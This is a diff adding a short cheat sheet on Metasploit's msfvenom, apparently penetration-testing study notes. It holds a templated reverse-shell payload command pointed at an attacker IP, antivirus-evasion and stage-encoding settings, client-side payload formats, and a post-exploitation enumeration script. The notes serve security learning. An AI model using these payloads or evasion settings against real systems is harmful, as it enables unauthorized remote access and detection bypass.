@@ -1,0 +1,57 @@
+=====
+basic
+=====
+msfvenom -p <payload module> LHOST=<attacker ip> LPORT=<listening port> -f <format>
+	additional options
+		-e <endoder>
+		-b "<bad characters>"
+
+====================
+staged vs non-staged
+====================
+windows/shell_reverse_tcp
+	connect back to attacker & spawn a command shell
+	good at antivirus evasion
+
+windows/shell/reverse_tcp
+	connect back to attacker
+	spawn cmd shell
+	good at small buffer size
+
+===========
+meterpreter
+===========
+multi-function payload
+useful for post-exploitation phase
+
+==========
+executable
+==========
+it can generate several executables
+can search
+	msfvenom -l formats
+
+=============
+multi handler
+=============
+listen the request of reverse shell
+can set payload
+
+===================
+client-side attacks
+===================
+hta-psh, vba, vba-psh
+
+================================
+advanced features and transports
+================================
+advanced features
+	show advanced
+
+helpful to bypass the detection
+	set EnableStageEncoding true
+	set StageEncoder x86/shikata_ga_nai
+
+start script automatically when the shell connected
+	set AutoRunScript <script>
+	ex. set AutoRunScript windows/gather/enum_logged_on_users
